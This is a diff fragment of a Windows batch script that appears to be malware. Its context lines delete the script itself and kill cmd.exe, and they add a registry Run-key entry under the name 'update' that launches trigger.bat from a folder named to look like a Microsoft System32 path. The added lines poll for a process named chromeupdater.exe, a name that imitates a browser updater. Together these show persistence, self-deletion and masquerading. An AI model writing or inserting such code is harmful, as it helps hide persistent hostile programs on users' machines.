@@ -65,6 +65,17 @@ start /b "" cmd /c del "%~f0" && taskkill /im cmd.exe /f
 
 ###################################################################################################################################
 
+:loop
+FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq chromeupdater.exe"') DO IF %%x == chromeupdater.exe goto found
+timeout 1 >nul
+goto loop
+
+:found
+timeout 1 >nul
+goto loop
+
+###################################################################################################################################
+
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "update" /t REG_SZ /f /d "%userprofile%\AppData\Roaming\Microsoft\System32\trigger.bat"
 
 ###################################################################################################################################
